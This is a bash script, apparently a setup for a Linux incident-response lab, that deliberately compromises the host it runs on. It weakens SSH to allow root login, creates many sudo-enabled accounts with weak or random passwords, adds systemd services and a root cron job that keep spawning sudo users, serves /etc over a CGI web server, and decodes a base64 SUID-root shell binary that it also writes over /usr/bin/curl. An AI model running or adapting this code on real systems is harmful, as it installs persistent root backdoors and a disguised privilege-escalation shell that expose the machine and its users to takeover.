#!/bin/bash

Main(){

  CreateTaunt
  sleep 2
  echo "Creating environment..."
  CreateEnvironment 3>&1 &>/dev/null
  echo "Created Issue 1"
  CreateSSHIssues 3>&1 &>/dev/null
  echo "Created Issue 2"
  CreateAnnoy
  echo "Created Issue 3"
  CreateServices 3>&1 &>/dev/null
  echo "Created Issue 4"
  CreateUsers 3>&1 &>/dev/null
  echo "Created Issue 5"
  sleep 1
  CreateUserSpawn 3>&1 &>/dev/null
  echo "Created Issue 6"
  sleep 1
  CreateCron
  echo "Created Issue 7"
  sleep 1
  CreatePyServer 3>&1 &>/dev/null
  echo "Created Issue 8"
  sleep 1
  CreateSUID
  echo "Created Issue 9"
  sleep 1
  CreateGoodbye
  sleep 1
  CreateLogin 3>&1 &>/dev/null
}

# --- Jacobs Functions ---
CreateEnvironment(){

  sudo apt update -y
  sudo apt install cowsay
  sudo apt install sshpass -y
  sudo apt install openssh-server -y
  sudo apt install sl -y
  sudo apt install cmatrix -y
  sudo apt install gcc -y
}

CreateSSHIssues(){

  append="StrictHostKeyChecking no"
  sudo echo "$append">>"/etc/ssh/ssh_config"
  sudo echo "$append">>"/etc/ssh/sshd_config"
  append="PermitRootLogin yes"
  sudo echo "$append">>"/etc/ssh/sshd_config"
}

CreateLogin(){
  count=0
  while :
  do
    sleep 10
    sshpass -p password ssh sUt6xpaFUs@localhost "echo "curl" | cat > ".bash_history""
    sleep 10
    sshpass -p password ssh sUt6xpaFUs@localhost
    for i in {1..5}
    do
      sleep 1m
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost "echo "curl" | cat > ".bash_history""
      sshpass -p password$count ssh sUt6xpaFUs$count@localhost
      sleep 1
    done
    let count++
    sshpass -p password$count ssh sUt6xpaFUs$count@localhost "echo "curl" | cat > ".bash_history""
    sshpass -p password$count ssh sUt6xpaFUs$count@localhost
  done
}

CreateUsers(){

  useradd -c "sUt6xpaFUs" -m sUt6xpaFUs -s /bin/bash
  echo "sUt6xpaFUs:password" | chpasswd
  usermod -a -G sudo sUt6xpaFUs

  for i in {1..69}
  do
    u=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)
    p=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)s
    useradd -m $u -p $p
    usermod -a -G sudo $u
    echo "user $u added with password: $p"
  done
}

CreateUserSpawn(){

  file_location=/root/.script/spawn.sh
  cat > $file_location <<'EOF'
#!/bin/bash

for i in {1..4}
do
	u=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)
	p=$(sudo head /dev/urandom | tr -dc A-Za-z0-9 | head -c10)

	useradd -m $u -p $p
	usermod -a -G sudo $u
	echo "user $u added with password: $p"
done

EOF
  sudo chmod +rwx  /root/.script/spawn.sh
}

CreateCron(){

  append="* *    * * *   root    bash /root/.script/spawn.sh"
  sudo echo "$append">>"/etc/crontab"
}

CreateServices(){

  sudo mkdir /root/.script
  file_location=/root/.script/script.sh
  cat > $file_location <<EOF
while :
do
        sleep 2
        echo "They don't even know about my malicious script"
done
EOF
  sudo chmod +rwx  /root/.script/script.sh

  file_location=/etc/systemd/system/evilservice.service 

  cat > $file_location <<EOF
[Unit]
Description=You found me
After=multi-user.target

[Service]
ExecStart=/usr/bin/bash /root/.script/script.sh
Type=simple

[Install]
WantedBy=multi-user.target

EOF
  sudo chmod +x  /etc/systemd/system/evilservice.service
  sudo systemctl daemon-reload >> /dev/null
  sudo systemctl enable evilservice.service
  sudo systemctl restart evilservice.service
  clear
  sudo mkdir /root/.utils
  file_location=/root/.utils/net.sh
  cat > $file_location<<'EOF'

#/bin/bash
count=0

while :
do
let count++
sleep 5m
echo $count
useradd -c "sUt6xpaFUs${count}" -m sUt6xpaFUs$count -s /bin/bash
echo "sUt6xpaFUs${count}:password${count}" | chpasswd
usermod -a -G sudo sUt6xpaFUs$count
done
EOF
  sudo chmod +rwx /root/.utils/net.sh
  file_location=/etc/systemd/system/sysnet.service
  cat > $file_location <<EOF
[Unit]
Description=Unit[2209.44]
After=multi-user.target

[Service]
ExecStart=/usr/bin/bash /root/.utils/net.sh
Type=simple

[Install]
WantedBy=multi-user.target

EOF
  sudo chmod +x  /etc/systemd/system/sysnet.service
  sudo systemctl daemon-reload
  sudo systemctl enable sysnet.service
  sudo systemctl restart sysnet.service
  clear
}

CreateAnnoy(){

  user=$(who | sed '1p;d' | cut -d ' ' -f 1)
  append='alias ls="sl -a"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias cd="cowsay You may not cd"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias cat="echo meow"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias nano="echo nanope"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias su="echo Super User Dont"'
  sudo echo "$append">>"/home/$user/.bashrc"
  append='alias sudo="cmatrix"'
  sudo echo "$append">>"/home/$user/.bashrc"
  source /home/$user/.bashrc
}

CreatePyServer(){
  cd /etc/ & sudo python3 -m 'http.server' --cgi 80 & disown
}

CreateSUID(){
# Shoutout Jack W for the uber small binary
  sudo mkdir /opt/scripts/
  file_location=/opt/scripts/tmp
  cat > $file_location << 'binary'
f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
binary
  cat /opt/scripts/tmp | base64 -d >> /opt/scripts/shell
  sudo rm /opt/scripts/tmp
  sudo chown root:root /opt/scripts/shell
  sudo chmod +sx /opt/scripts/shell

  file_location=/usr/bin/tmp
  sudo cat > $file_location << 'binary'
f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
binary
  sudo cat /usr/bin/tmp | sudo base64 -d >> /usr/bin/curl
  sudo rm /usr/bin/tmp
  sudo chown root:root /usr/bin/curl
  sudo chmod +sx /usr/bin/curl
}

CreateTaunt(){
cat << 'taunt'
 _____________________________________
< Everything will be ok, I promise.   >
 -------------------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/


taunt
echo "Please relax, this may take a minute."
}

CreateGoodbye(){
clear
sleep 1
reset

cat << 'bye'
 ___________
< Good luck >
 -----------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

bye
echo "Script finished! Please keep this terminal open until the lab is complete."
}

# --- Jacobs Functions End---

Main
